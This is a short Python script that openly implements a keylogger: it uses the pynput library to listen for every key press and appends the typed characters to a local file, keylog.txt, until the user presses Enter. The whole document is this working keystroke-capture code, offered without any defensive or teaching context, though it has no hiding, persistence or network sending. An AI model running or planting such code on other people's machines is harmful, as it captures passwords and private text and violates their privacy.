from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as logkey:
        try:
           char = key.char
           logkey.write(char)
        except:
            print("Error getting char") 

if __name__ == "__main__":
    try:
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()
        input("Press Enter to stop keylogger...")
    except Exception as e:
        print(f"An error occurred: {e}")
